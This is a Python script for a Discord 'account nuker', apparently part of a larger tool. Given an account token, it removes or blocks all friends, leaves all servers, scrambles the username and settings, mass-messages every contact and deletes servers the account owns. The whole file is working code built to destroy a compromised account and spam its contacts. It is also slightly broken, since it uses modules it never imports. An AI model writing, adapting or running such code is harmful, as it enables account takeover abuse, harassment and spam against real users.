import asyncio
import json
from utils import DiscordAPI, Logger

class AccountNuker:
    def __init__(self, token):
        self.api = DiscordAPI(token)
    
    async def remove_all_friends(self):
        Logger.info("Removing all friends")
        status, friends = await self.api.request('GET', 'https://discord.com/api/v9/users/@me/relationships')
        
        if status == 200:
            tasks = []
            for friend in friends:
                tasks.append(self.api.request('DELETE', 
                    f'https://discord.com/api/v9/users/@me/relationships/{friend["id"]}'))
            
            await asyncio.gather(*tasks)
            Logger.success(f"Removed {len(friends)} friends")
    
    async def block_all_friends(self):
        Logger.info("Blocking all friends")
        status, friends = await self.api.request('GET', 'https://discord.com/api/v9/users/@me/relationships')
        
        if status == 200:
            tasks = []
            for friend in friends:
                tasks.append(self.api.request('PUT', 
                    f'https://discord.com/api/v9/users/@me/relationships/{friend["id"]}',
                    json={'type': 2}))  # type 2 = block
            
            await asyncio.gather(*tasks)
            Logger.success(f"Blocked {len(friends)} friends")
    
    async def leave_all_servers(self):
        Logger.info("Leaving all servers")
        status, guilds = await self.api.request('GET', 'https://discord.com/api/v9/users/@me/guilds')
        
        if status == 200:
            tasks = []
            for guild in guilds:
                tasks.append(self.api.request('DELETE', 
                    f'https://discord.com/api/v9/users/@me/guilds/{guild["id"]}'))
            
            await asyncio.gather(*tasks)
            Logger.success(f"Left {len(guilds)} servers")
    
    async def cycle_token_settings(self):
        Logger.info("Cycling token settings (nuking account)")
        
        # Change username
        random_user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        await self.api.request('PATCH', 'https://discord.com/api/v9/users/@me',
                              json={'username': random_user})
        
        # Change avatar to default
        await self.api.request('PATCH', 'https://discord.com/api/v9/users/@me',
                              json={'avatar': None})
        
        # Disable all settings
        settings_payload = {
            "theme": "dark",
            "developer_mode": False,
            "timezone_offset": 0,
            "locale": "en-US",
            "explicit_content_filter": 0,
            "custom_status": None,
            "status": "invisible"
        }
        
        await self.api.request('PATCH', 'https://discord.com/api/v9/users/@me/settings',
                              json=settings_payload)
        
        Logger.success("Account settings nuked")
    
    async def mass_dm(self, message):
        Logger.info("Starting mass DM attack")
        status, friends = await self.api.request('GET', 'https://discord.com/api/v9/users/@me/relationships')
        
        if status == 200:
            tasks = []
            for friend in friends:
                # Create DM channel
                status2, dm_data = await self.api.request('POST', 'https://discord.com/api/v9/users/@me/channels',
                                                         json={'recipient_id': friend['id']})
                
                if status2 == 200:
                    tasks.append(self.api.request('POST', 
                        f'https://discord.com/api/v9/channels/{dm_data["id"]}/messages',
                        json={'content': message}))
            
            await asyncio.gather(*tasks)
            Logger.success(f"Sent DMs to {len(tasks)} users")
    
    async def close_all_dms(self):
        Logger.info("Closing all DMs")
        status, dms = await self.api.request('GET', 'https://discord.com/api/v9/users/@me/channels')
        
        if status == 200:
            tasks = []
            for dm in dms:
                if dm['type'] == 1:  # DM channel
                    tasks.append(self.api.request('DELETE', 
                        f'https://discord.com/api/v9/channels/{dm["id"]}'))
            
            await asyncio.gather(*tasks)
            Logger.success(f"Closed {len(tasks)} DMs")
    
    async def delete_all_personal_guilds(self):
        Logger.info("Deleting all personal guilds")
        status, guilds = await self.api.request('GET', 'https://discord.com/api/v9/users/@me/guilds')
        
        if status == 200:
            tasks = []
            for guild in guilds:
                # Check if user owns the guild
                status2, guild_data = await self.api.request('GET', 
                    f'https://discord.com/api/v9/guilds/{guild["id"]}')
                
                if status2 == 200 and guild_data.get('owner', False):
                    tasks.append(self.api.request('DELETE', 
                        f'https://discord.com/api/v9/guilds/{guild["id"]}'))
            
            await asyncio.gather(*tasks)
            Logger.success(f"Deleted {len(tasks)} personal guilds")

async def main():
    token = input("Enter token: ")
    nuker = AccountNuker(token)
    
    print("\n15. Remove All Friends")
    print("16. Block All Friends")
    print("17. Leave All Servers")
    print("18. Cycle Token Settings")
    print("19. Mass DM")
    print("20. Close All DMs")
    print("21. Delete All Personal Guilds")
    
    choice = input("\nSelect option: ")
    
    if choice == "15":
        await nuker.remove_all_friends()
    
    elif choice == "16":
        await nuker.block_all_friends()
    
    elif choice == "17":
        await nuker.leave_all_servers()
    
    elif choice == "18":
        await nuker.cycle_token_settings()
    
    elif choice == "19":
        message = input("DM message: ")
        await nuker.mass_dm(message)
    
    elif choice == "20":
        await nuker.close_all_dms()
    
    elif choice == "21":
        await nuker.delete_all_personal_guilds()

if __name__ == "__main__":
    asyncio.run(main())
